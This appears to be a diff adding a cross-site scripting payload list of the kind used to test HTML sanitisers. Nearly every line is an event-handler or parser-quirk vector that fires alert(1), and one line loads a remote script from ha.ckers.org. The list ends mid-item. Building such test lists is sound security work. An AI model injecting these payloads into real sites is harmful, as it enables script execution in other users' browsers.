@@ -1,0 +1,46 @@
+<b draggable="true" ondrag="alert(1)">test</b>
+<b draggable="true" ondragend="alert(1)">test</b>
+<b draggable="true" ondragenter="alert(1)">test</b>
+<b draggable="true" ondragleave="alert(1)">test</b>
+<b draggable="true" ondragstart="alert(1)">test</b>
+<b id=x tabindex=1 onactivate=alert(1)></b>
+<b id=x tabindex=1 onbeforeactivate=alert(1)></b>
+<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>
+<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>
+<b id=x tabindex=1 onfocus=alert(1)></b>
+<b id=x tabindex=1 onfocusin=alert(1)></b>
+<b onbeforecopy="alert(1)" contenteditable>test</b>
+<b onbeforecut="alert(1)" contenteditable>test</b>
+<b onbeforepaste="alert(1)" contenteditable>test</b>
+<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>
+<b onclick="alert(1)">test</b>
+<b oncontextmenu="alert(1)">test</b>
+<b oncopy="alert(1)" contenteditable>test</b>
+<b oncut="alert(1)" contenteditable>test</b>
+<b ondblclick="alert(1)">test</b>
+<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>
+<b onkeydown="alert(1)" contenteditable>test</b>
+<b onkeypress="alert(1)" contenteditable>test</b>
+<b onkeyup="alert(1)" contenteditable>test</b>
+<b onmousedown="alert(1)">test</b>
+<b onmouseenter="alert(1)">test</b>
+<b onmouseleave="alert(1)">test</b>
+<b onmousemove="alert(1)">test</b>
+<b onmouseout="alert(1)">test</b>
+<b onmouseover="alert(1)">test</b>
+<b onmouseup="alert(1)">test</b>
+<b onpaste="alert(1)" contenteditable>test</b>
+<div draggable="true" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>
+<div draggable="true" contenteditable>drag me</div><b ondrop=alert(1) contenteditable>drop here</b>
+<style>:target {color: red;}</style><b id=x style="transition:color 10s" ontransitioncancel=alert(1)></b>
+<style>:target {color:red;}</style><b id=x style="transition:color 1s" ontransitionend=alert(1)></b>
+<style>:target {transform: rotate(180deg);}</style><b id=x style="transition:transform 2s" ontransitionrun=alert(1)></b>
+<style>@keyframes slidein {}</style><b style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></b>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style="position:absolute;" onanimationcancel="alert(1)"></b>
+<style>@keyframes x{}</style><b style="animation-name:x" onanimationend="alert(1)"></b>
+<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>
+<svg><b onload=alert(1)></b>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+<div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div><div id="55"><video><source onerror="alert(55)">//["'`-->]]>]</div><div id="56"><video onerror="alert(56)"><source></source></video>//["'`-->]]>]</div><div id="57"><b <script>alert(57)//</script>0</script></b>//["'`-->]]>]</div><div id="58"><b><script<b></b><alert(58)</script </b></b>//["'`-->]]>]</div><div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'`-->]]>]</div><div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'`-->]]>]</div>
+<div id="128"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>
+<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
